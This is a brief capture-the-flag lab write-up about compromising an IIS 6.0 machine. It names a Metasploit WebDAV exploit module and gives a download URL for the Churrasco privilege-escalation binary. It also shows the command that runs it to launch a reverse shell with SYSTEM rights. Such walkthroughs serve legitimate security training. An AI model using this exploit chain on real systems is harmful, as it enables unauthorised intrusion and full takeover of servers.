# Grandpa  

## Nmap  

All ports  

`80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0`  

## Shell  

The following msfconsole module was used to gain a shell on IIS 6.0.  

`windows/iis/iis_webdav_scstoragepathfromurl`  

## Root  

Using the following vuln, I connected back to my listener as nt\authority. All files were uploaded through msf.  

Binary downloaded from.  

`https://github.com/Re4son/Churrasco/raw/master/churrasco.exe`  

`.\churrasco.exe -d "c:\Inetpub\wwwroot\root-shell.exe"`

I received a SYSTEM shell back to my listener.
